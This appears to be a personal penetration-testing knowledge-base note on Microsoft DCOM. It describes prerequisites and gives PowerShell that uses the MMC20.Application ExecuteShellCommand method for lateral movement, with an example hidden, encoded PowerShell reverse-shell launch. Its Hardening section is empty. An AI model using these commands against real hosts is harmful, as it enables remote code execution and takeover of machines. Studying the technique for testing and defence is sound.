---
tags:
  - "#type/tech-specific"
---
# Fundamentals

See: [Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN)

The Distributed Component Object Model (DCOM) is a very old technology to allow processes to interact with each other across multiple computers. Uses [[2 Tech-Specifics/Network/Protocols/TCP 135 msrpc|TCP 135 msrpc]] to create a session and the performs [RPCs](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) to provide access to objects on a remote machine.

# DCOM

## Lateral Movement

Further techniques: https://www.cybereason.com/blog/dcom-lateral-movement-techniques

**Prerequisites:**
- local "Administrator" user or Domain user with local admin rights on the target machine
- [[2 Tech-Specifics/Network/Protocols/TCP 135 msrpc|TCP 135 msrpc]] running on target
- DCOM remote access enabled on target

### Microsoft Management Console (MMC)

A microsoft application for automated management tasks. Allows to create application objects, which expose an `ExecuteShellCommand` method.

Create MMC 2.0 object on target:

```powershell

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
```

execute shell command:

```powershell

$dcom.Document.ActiveView.ExecuteShellCommand("<shell>",$null,"<command>","7")

```

Parameters:

- `<shell>`: the shell to use, either [[3 Tools/shells/cmd|cmd]] or [[3 Tools/shells/PowerShell|PowerShell]]
- `<command>`: the command to execute - e.g. `powershell -nop -w hidden -e <reverse_shell>`

# Hardening
